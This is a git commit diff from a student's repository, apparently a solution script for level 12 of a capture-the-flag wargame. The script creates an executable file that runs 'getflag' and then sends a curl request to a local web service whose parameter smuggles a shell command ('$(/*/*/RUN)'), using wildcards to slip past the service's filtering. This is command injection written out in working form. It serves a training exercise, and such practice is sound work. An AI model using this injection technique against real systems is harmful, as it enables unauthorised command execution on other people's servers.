5fe7dd13f16fc9fbc95bdf35981899f475403f95
mhufflep <mhufflep@student.21-school.ru>
2022-10-06 22:53:33 +0500

    update level12

--- level12/Resources/cmd.sh
+++ level12/Resources/cmd.sh
@@ -1,5 +1,7 @@
 # https://perldoc.perl.org/perlop#Quote-and-Quote-like-Operators
 
-echo -e "#!/bin/bash\ngetflag>/var/crash/key" > /var/crash/RUN
+echo -e '#!/bin/bash\ngetflag>/var/crash/key' > /var/crash/RUN
+
+chmod +x /var/crash/RUN
 
 curl http://localhost:4646?x='$(/*/*/RUN)'
